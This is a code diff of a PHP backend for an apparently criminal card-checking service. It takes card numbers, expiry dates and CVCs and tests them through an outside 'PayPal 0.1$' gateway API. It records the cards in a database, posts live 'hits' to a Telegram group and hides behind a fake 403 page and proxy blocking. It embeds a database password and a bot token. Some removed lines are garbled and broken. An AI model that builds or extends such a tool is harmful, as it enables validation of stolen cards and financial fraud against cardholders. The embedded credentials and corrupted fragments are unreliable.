@@ -1,8 +1,149 @@
 <?php
-<?php
 // FOR DEBUGGING: If you get a 500 error, uncomment the lines below to see the exact error
 // ini_set('display_errors', 1);
 // error_reporting(E_ALL);
+
+// Set headers to prevent caching
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Cache-Control: post-check=0, pre-check=0', false);
+header('Pragma: no-cache');
+header('Content-Type: application/json');
+
+// Enable error logging for debugging
+ini_set('log_errors', 1);
+ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
+
+// --- MOVED log_message function to the top to prevent 500 errors ---
+// Optional file-based logging for debugging
+ $log_file = __DIR__ . '/paypal0.1$_debug.log';
+function log_message($message) {
+    global $log_file;
+    $timestamp = date('Y-m-d H:i:s');
+    // Ensure the message is a string
+    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
+    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
+}
+
+// === DATABASE CONNECTION ===
+ $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
+
+try {
+    $dbUrl = parse_url($databaseUrl);
+    $host = $dbUrl['host'] ?? null;
+    $port = $dbUrl['port'] ?? 5432;
+    $user = $dbUrl['user'] ?? null;
+    $pass = $dbUrl['pass'] ?? null;
+    $path = $dbUrl['path'] ?? null;
+
+    if (!$host || !$user || !$pass || !$path) {
+        throw new Exception("Missing DB connection parameters");
+    }
+
+    $dbName = ltrim($path, '/');
+    
+    // Set connection timeout with extended options and SSL mode
+    $pdo = new PDO(
+        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
+        $user,
+        $pass,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_TIMEOUT => 15,
+            PDO::ATTR_PERSISTENT => false,
+            PDO::ATTR_EMULATE_PREPARES => false
+        ]
+    );
+    
+    // Store the database connection in a global variable for use in recordCardCheck
+    $GLOBALS['pdo'] = $pdo;
+    
+    // === TABLE SETUP ===
+    // Check if card_checks table exists
+    $tableExists = $pdo->query("SELECT to_regclass('public.card_checks')")->fetchColumn();
+    
+    if (!$tableExists) {
+        // Create card_checks table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE card_checks (
+                id SERIAL PRIMARY KEY,
+                user_id BIGINT,
+                card_number VARCHAR(255),
+                status VARCHAR(50),
+                response TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created card_checks table");
+    }
+    
+    // Check if users table exists
+    $usersTableExists = $pdo->query("SELECT to_regclass('public.users')")->fetchColumn();
+    
+    if (!$usersTableExists) {
+        // Create users table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE users (
+                id SERIAL PRIMARY KEY,
+                telegram_id BIGINT UNIQUE,
+                name VARCHAR(255),
+                username VARCHAR(255),
+                photo_url VARCHAR(255),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created users table");
+    } else {
+        // Check if username column exists in users table
+        $columnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'username'
+        ")->fetchColumn();
+        
+        // Add username column if it doesn't exist
+        if (!$columnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN username VARCHAR(255)");
+            log_message("Added username column to users table");
+        }
+        
+        // Check if photo_url column exists in users table
+        $photoColumnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'photo_url'
+        ")->fetchColumn();
+        
+        // Add photo_url column if it doesn't exist
+        if (!$photoColumnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN photo_url VARCHAR(255)");
+            log_message("Added photo_url column to users table");
+        }
+    }
+    
+    // Check if user_stats table exists, create if not
+    $statsTableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
+    if (!$statsTableExists) {
+        $pdo->exec("
+            CREATE TABLE user_stats (
+                id SERIAL PRIMARY KEY,
+                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
+                hits INTEGER DEFAULT 0,
+                last_hit TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created user_stats table");
+    }
+    
+} catch (PDOException $e) {
+    error_log("Database PDO Error in paypal0.1$.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
+    exit;
+} catch (Exception $e) {
+    error_log("General Error in paypal0.1$.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
+    exit;
+}
 
 // Check if this is a GET request and show the HTML page immediately
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
@@ -17,31 +158,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
           </head> 
           <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
           <div style="height:auto; min-height:100%; "> 
-          <div style="height:auto; min-height:100%; "> 
           <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
           <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
-          <p>Access to this resource on the server is denied!</p> 
+          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2>
+          <p>Access to this resource on the server is denied!</p>
           </div></div></body></html>';
     
     exit;
-}
-
-header('Content-Type: application/json');
-
-// Enable error logging
-ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
-
-// --- MOVED log_message function to the top to prevent 500 errors ---
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    $timestamp = date('Y-m-d H:i:s');
-    // Ensure the message is a string
-    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
-    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
 }
 
 // --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---
@@ -115,18 +238,16 @@ function showForbiddenPage() {
     echo '<html style="height:100%"> 
           <head> 
           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
-          <title> 403 Forbidden</title>
+          <title> 403 Forbidden </title>
           <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
           </head> 
           <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
           <div style="height:auto; min-height:100%; "> 
-          <div style="height:auto; min-height:100%; "> 
-          <div style="height:auto; min-height:100%; "> 
           <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
           <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
-          <p>Access to this resource on the server is denied!</p> 
-          </div></div></div></body></html>';
+          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2>
+          <p>Access to this resource on the server is denied!</p>
+          </div></div></body></html>';
     
     exit; // Ensure script execution stops completely
 }
@@ -143,127 +264,6 @@ if (checkProxyIP($user_ip)) {
 
 // --- END OF PROXY DETECTION LOGIC ---
 
-// === DATABASE CONNECTION ===
- $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
-
-try {
-    $dbUrl = parse_url($databaseUrl);
-    $host = $dbUrl['host'] ?? null;
-    $port = $dbUrl['port'] ?? 5432;
-    $user = $dbUrl['user'] ?? null;
-    $pass = $dbUrl['pass'] ?? null;
-    $path = $dbUrl['path'] ?? null;
-
-    if (!$host || !$user || !$user || !$pass || !$path) {
-        throw new Exception("Missing DB connection parameters");
-    }
-
-    $dbName = ltrim($path, '/');
-    
-    // Set connection timeout with extended options and SSL mode
-    $pdo = new PDO(
-        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
-        $user,
-        $pass,
-        [
-            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-            PDO::ATTR_TIMEOUT => 15,
-            PDO::ATTR_PERSISTENTENT => false,
-            PDO::ATTR_EMULATE_PREPARES => false
-        ]
-    );
-    
-    // Store the database connection in a global variable for use in recordCardCheck
-    $GLOBALS['pdo'] = $pdo;
-    
-    // === TABLE SETUP ===
-    // Check if card_checks table exists
-    $tableExists = $pdo->query("SELECT to_regclass('public.card_checks')")->fetchColumn();
-    
-    if (!$tableExists) {
-        // Create card_checks table if it doesn't exist
-        $pdo->exec("
-            CREATE TABLE card_checks (
-                id SERIAL PRIMARY KEY,
-                user_id BIGINT,
-                card_number VARCHAR(255),
-                status VARCHAR(50),
-                response TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            );
-        ");
-        log_message("Created card_checks table");
-    }
-    
-    // Check if users table exists
-    $usersTableExists = $pdo->query("SELECT to_regclass('public.users')")->fetchColumn();
-    
-    if (!$usersTableExists) {
-        // Create users table if it doesn't exist
-        $pdo->exec("
-            CREATE TABLE users (
-                id SERIAL PRIMARY KEY,
-                telegram_id BIGINT UNIQUE,
-                name VARCHAR(255),
-                username VARCHAR(255),
-                photo_url VARCHAR(255),
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            ");
-        ");
-        log_message("Created users table");
-    } else {
-        // Check if username column exists in users table
-        $columnExists = $pdo->query("
-            SELECT column_name 
-            FROM information_schema.columns 
-            WHERE table_name = 'users' AND column_name = 'username'
-        ")->fetchColumn();
-        
-        // Add username column if it doesn't exist
-        if (!$columnExists) {
-            $pdo->exec("ALTER TABLE users ADD COLUMN username VARCHAR(255)");
-            log_message("Added username column to users table");
-        }
-        
-        // Check if photo_url column exists in users table
-        $photoColumnExists = $pdo->query("
-            SELECT column_name 
-            FROM information_schema.columns 
-            WHERE table_name = 'users' AND column_name = 'photo_url'
-        ")->fetchColumn();
-        
-        // Add photo_url column if it doesn't exist
-        if (!$photoColumnExists) {
-            $pdo->exec("ALTER TABLE users ADD COLUMN photo_url VARCHAR(255)");
-            log_message("Added photo_url column to users table");
-        }
-    }
-    
-    // Check if user_stats table exists, create if not
-    $statsTableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
-    if (!$statsTableExists) {
-        $pdo->exec("
-            CREATE TABLE user_stats (
-                id SERIAL PRIMARY KEY,
-                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
-                hits INTEGER DEFAULT 0,
-                last_hit TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            );
-        ");
-        log_message("Created user_stats table");
-    }
-    
-} catch (PDOException $e) {
-    error_log("Database PDO Error in paypal0.1$.php: " . $e->getMessage());
-    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
-    exit;
-} catch (Exception $e) {
-    error_log("General Error in paypal0.1$.php: " . $e->getMessage());
-    echo json_encode(['status' => 'error', 'message' => 'Server error']);
-    exit;
-}
-
 // Start session for user authentication
 session_start([
     'cookie_secure' => isset($_SERVER['HTTPS']),
@@ -274,27 +274,7 @@ session_start([
 // Check if user is authenticated
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access', 'response' => 'Forbidden Access']);
-    log_message('Error 401: ' . json_encode($errorMsg));
-    echo json_encode($errorMsg);
-    exit;
-}
-
-// Validate API key
- $validation = validateApiKey();
-if (!$validation['valid']) {
-    http_response_code(401);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key', 'response' => 'Invalid API Key']);
-    log_message('Error 401: ' . json_encode($errorMsg));
-    echo json_encode($errorMsg);
-    exit;
-}
-
- $expectedApiKey = $validation['response']['apiKey'];
- $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
-if ($providedApiKey !== $expectedApiKey) {
-    http_response_code(401);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key', 'response' => 'Invalid API Key'];
+    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
     log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
@@ -337,50 +317,80 @@ function formatResponse($response) {
 function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
     global $sent_notifications;
     
-    try {
-        // Create a unique key for this card to prevent duplicates
-        $notification_key = md5($card_details . $status . $response);
-        
-        // Check if we've already sent this notification
-        if (isset($sent_notifications[$notification_key])) {
-            log_message("Skipping duplicate notification for $card_details: $status");
-            return;
-        }
-        
-        // Mark this notification as sent
-        $sent_notifications[$notification_key] = true;
-        
-        // Check both formatted response and original API response for 3DS
-        $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
-        if (is3DAuthenticationResponse($checkResponse)) {
-            log_message("Skipping Telegram notification for 3DS response: $checkResponse");
-            return;
-        }
-        
-        // Only proceed if status is CHARGED or APPROVED
-        if ($status !== 'CHARGED' && $status !== 'APPROVED') {
-            log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
-            return;
-        }
-
-        // Load Telegram Bot Token from environment (secure storage)
-        $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
-        $chat_id = '-1003204998888'; // Your group chat ID
-        $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
-        $site_link = 'https://cxchk.site';
-
-        // Get user info from session
-        $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
-        $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
-        $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
-        $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-        $gateway = 'PayPal 0.1$'; // Updated for this gateway
-        $formatted_response = formatResponse($response);
-
-        // Construct Telegram message
-        $message = "<b>✦━━[ 𝐇𝐈𝐈𝐓 𝐃𝐄𝐄𝐓𝐄𝐄𝐄𝐓𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄��𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄��𝐄��𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄𝐄��𝐄𝐄𝐄��𝐄𝐄𝐄��𝐄𝐄𝐄𝐄𝐄��𝐄𝐄𝐄��𝐄𝐄𝐄𝐄𝐄𝐄��𝐄𝐄𝐄𝐄����𝐄��𝐄����𝐄𝐄𝐄��𝐄��𝐄�𝐄�𝐄�𝐄�' !== false) {
-        log_message("SESSION NOT STARTED: " . json_encode($_SESSION));
+    // Create a unique key for this card to prevent duplicates
+    $notification_key = md5($card_details . $status . $response);
+    
+    // Check if we've already sent this notification
+    if (isset($sent_notifications[$notification_key])) {
+        log_message("Skipping duplicate notification for $card_details: $status");
+        return;
     }
+    
+    // Mark this notification as sent
+    $sent_notifications[$notification_key] = true;
+    
+    // Check both formatted response and original API response for 3DS
+    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+    if (is3DAuthenticationResponse($checkResponse)) {
+        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+        return;
+    }
+    
+    // Only proceed if status is CHARGED or APPROVED
+    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+        return;
+    }
+
+    // Load Telegram Bot Token from environment (secure storage)
+    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
+    $chat_id = '-1003204998888'; // Your group chat ID
+    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
+    $site_link = 'https://cxchk.site';
+
+    // Get user info from session
+    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
+    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
+    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
+    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
+    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
+    $formatted_response = formatResponse($response);
+
+    // Construct Telegram message
+    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
+               "<b>――――――――――――</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
+
+    // Send to Telegram
+    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
+    $payload = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true
+    ];
+
+    $ch = curl_init($telegram_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
+    curl_close($ch);
+
+    if ($http_code !== 200 || !$result) {
+        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
+    } else {
+        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
+    }
+}
 
 // Function to record card check in database and update user stats
 function recordCardCheck($pdo, $card_number, $status, $response) {
@@ -399,7 +409,7 @@ function recordCardCheck($pdo, $card_number, $status, $response) {
                 // Create new user
                 $stmt = $pdo->prepare("
                     INSERT INTO users (telegram_id, name, username, photo_url) 
-                    VALUES (?, ?, ?, ?, ?)
+                    VALUES (?, ?, ?, ?)
                     RETURNING id
                 ");
                 $stmt->execute([
@@ -430,7 +440,7 @@ function recordCardCheck($pdo, $card_number, $status, $response) {
                     $stmt->execute([$userId]);
                 } else {
                     // Create new record
-                    $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit = NOW()) VALUES (?, 1, NOW())");
+                    $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit) VALUES (?, 1, NOW())");
                     $stmt->execute([$userId]);
                 }
                 
@@ -445,6 +455,12 @@ function recordCardCheck($pdo, $card_number, $status, $response) {
     } catch (Exception $e) {
         log_message("General error in recordCardCheck: " . $e->getMessage());
     }
+}
+
+// Check if card details are provided
+if (!isset($_POST['card']) || !is_array($_POST['card'])) {
+    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
+    exit;
 }
 
 // Function to check a single card via PayPal 0.1$ API
@@ -463,7 +479,8 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 50);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
 
         $response = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -480,11 +497,11 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         if ($response === false || $http_code !== 200 || !empty($curl_error)) {
             if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                 log_message("Timeout for $card_details, retrying...");
-                usleep(500000); // 0.5s delay before retry
+                usleep(500000);
                 continue;
             }
-            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno) for $card_details");
-            $last_result = "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno) for $card_details;
+            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
+            $last_result = "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)]";
             return $last_result;
         }
 
@@ -498,23 +515,20 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
 
         // Convert to uppercase for consistent comparison
         $status = strtoupper($result['status'] ?? '');
-        $response_msg = $result['response'] ?? 'Unknown error';
-        
+        $message = strtoupper($result['response'] ?? '');
+
         // Map API response to status
         $final_status = 'DECLINED';
-        $response_msg = $response_msg;
-        
+        $response_msg = htmlspecialchars($result['response'] ?? 'Unknown error', ENT_QUOTES, 'UTF-8');
+
         // Only set CHARGED status when message is exactly "CARD ADDED"
-        if ($response === 'CARD ADDED') {
+        if ($message === 'CARD ADDED') {
             $final_status = 'CHARGED';
             $response_msg = 'Your $0.01 payment was successful.';
-        } elseif ($status === 'APPROVED' || $response === 'EXISTING_ACCOUNT_RESTRICTED') {
+        } elseif ($status === 'APPROVED' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
             $final_status = 'APPROVED';
         } elseif ($status === 'DECLINED') {
             $final_status = 'DECLINED';
-        } else {
-            $final_status = 'DECLINED';
-            $response_msg = "Unknown status: $status";
         }
 
         $last_result = "$final_status [$response_msg]";
@@ -525,16 +539,16 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         $our_message = $response_msg;
         recordCardCheck($GLOBALS['pdo'], $card_number, $our_status, $our_message);
 
-        // Send Telegram notification for CHARGED or APPROVED (only once)
-        if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
-            sendTelegramNotification($card_details, $final_status, $last_result, $response);
-        }
-
-        return $last_result;
+        // If we got a valid response, don't retry
+        break;
     }
 
-    log_message("Failed after retries for $card_details");
-    return "DECLINED [API request failed after retries]";
+    // Send Telegram notification for CHARGED or APPROVED (only once)
+    if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
+        sendTelegramNotification($card_details, $final_status, $last_result, $last_response);
+    }
+
+    return $last_result;
 }
 
 // Function to check multiple cards in parallel
@@ -563,40 +577,38 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
         if (strlen($exp_year_raw) == 2) {
             $current_year = (int) date('y');
             $current_century = (int) (date('Y') - $current_year);
-            $card_year = (int) $exp_year_raw);
+            $card_year = (int) $exp_year_raw;
             $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
         } elseif (strlen($exp_year_raw) == 4) {
-            $exp_year = (int) $exp_year_raw);
+            $exp_year = (int) $exp_year_raw;
         } else {
-            $exp_year = (int) date('Y') + 1);
+            $exp_year = (int) date('Y') + 1;
         }
-        } elseif (strlen($exp_year_raw) == 4) {
-            $exp_year = (int) $exp_year_raw);
-        } else {
-            $exp_year = (int) date('Y') + 1);
-        }
-        
+
         $card_details = "$card_number|$exp_month|$exp_year|$cvc";
         $card_details_map[$index] = $card_details;
         $encoded_cc = urlencode($card_details);
-        $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=$encoded_cc";
+        $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
 
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 50);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');
 
         $chs[$index] = $ch;
         curl_multi_add_handle($mh, $ch);
         log_message("Added parallel check for card $index: $card_details");
+
         $processed++;
     }
 
     $running = null;
     do {
         curl_multi_exec($mh, $running);
+        curl_multi_select($mh);
     } while ($running > 0);
 
     foreach ($chs as $index => $ch) {
@@ -607,46 +619,45 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
         curl_close($ch);
 
         if ($response === false || $http_code !== 200 || !empty($curl_error)) {
-            $results[$index] = "DECLINED [API request failed: $curl_error (HTTP $http_code) for card $index: $curl_error (HTTP $http_code)"];
-            log_message("Parallel check failed for card $index: $curl_error (HTTP $http_code) for card $index: $curl_error (HTTP $http_code)");
+            $results[$index] = "DECLINED [Parallel API request failed: $curl_error (HTTP $http_code)]";
+            log_message("Parallel check failed for card $index: $curl_error (HTTP $http_code)");
             continue;
         }
 
         $result = json_decode($response, true);
-        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
-            $results[$index] = "DECLINED [Invalid parallel API response: " . substr($response, 0, 200) . "]");
-            log_message("Invalid JSON in parallel check for card $index: " . substr($response, 0, 200) . "]");
+        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
+            $results[$index] = "DECLINED [Invalid parallel API response: " . substr($response, 0, 200) . "]";
+            log_message("Invalid JSON in parallel check for card $index: " . substr($response, 0, 200));
             continue;
         }
 
         // Convert to uppercase for consistent comparison
         $status = strtoupper($result['status'] ?? '');
+        $message = strtoupper($result['response'] ?? '');
+
+        $final_status = 'DECLINED';
         $response_msg = $result['response'] ?? 'Unknown error';
         
-        // Determine our status based on API response
-        $final_status = 'DECLINED';
-        $response_msg = $response_msg;
-        
-        if ($status === "APPROVED" || $response === 'EXISTING_ACCOUNT_RESTRICTED') {
+        if ($message === 'CARD ADDED') {
+            $final_status = 'CHARGED';
+            $response_msg = 'Your $0.01 payment was successful.';
+        } elseif ($status === 'APPROVED' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
             $final_status = 'APPROVED';
-        } elseif ($status === "DECLINED") {
+        } elseif ($status === 'DECLINED') {
             $final_status = 'DECLINED';
-        } else {
-            $final_status = 'DECLINED';
-            $response_msg = "Unknown status: $status";
         }
-        
+
         $results[$index] = "$final_status [$response_msg]";
-        log_message("$final_status for $card_details: $response_msg");
+        log_message("Parallel result for card $index: $final_status [$response_msg]");
         
         // Record the card check result in the database
         $our_status = $final_status;
         $our_message = $response_msg;
-        recordCardCheck($GLOBALS['pdo'], $card_details, $our_status, $our_message);
+        recordCardCheck($GLOBALS['pdo'], $card_details_map[$index], $our_status, $our_message);
 
         // Send Telegram notification for CHARGED or APPROVED
         if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
-            sendTelegramNotification($card_details, $final_status, $results[$index], $results[$index]);
+            sendTelegramNotification($card_details_map[$index], $final_status, $results[$index], $response);
         }
     }
 
@@ -655,203 +666,81 @@ function checkCardsParallel($cards, $max_concurrent = 3) {
 }
 
 // Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
+if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
     log_message("Invalid request or missing card data");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
+    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid request or missing card data']);
     exit;
 }
 
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
-    log_message("Invalid request or missing card data");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
-    exit;
-}
-
